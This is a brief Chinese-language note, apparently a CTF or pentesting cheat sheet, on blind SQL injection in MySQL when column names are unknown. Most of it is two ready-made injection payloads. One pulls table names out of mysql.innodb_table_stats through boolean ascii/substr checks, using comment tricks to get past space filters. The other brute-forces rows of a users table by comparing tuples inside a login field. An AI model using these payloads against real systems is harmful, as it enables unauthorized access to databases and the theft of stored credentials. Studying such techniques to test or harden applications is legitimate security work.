无列名盲注比较法：
admin'||ascii(substr((select/**/1,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),1,1))>0#
使用mysql.innodb_table_stats获取表名
然后构造
username=admin'||/**/('1','tanji','z')<(select/**/*/**/from/**/users/**/limit/**/0,1)#&password=admin
爆破注入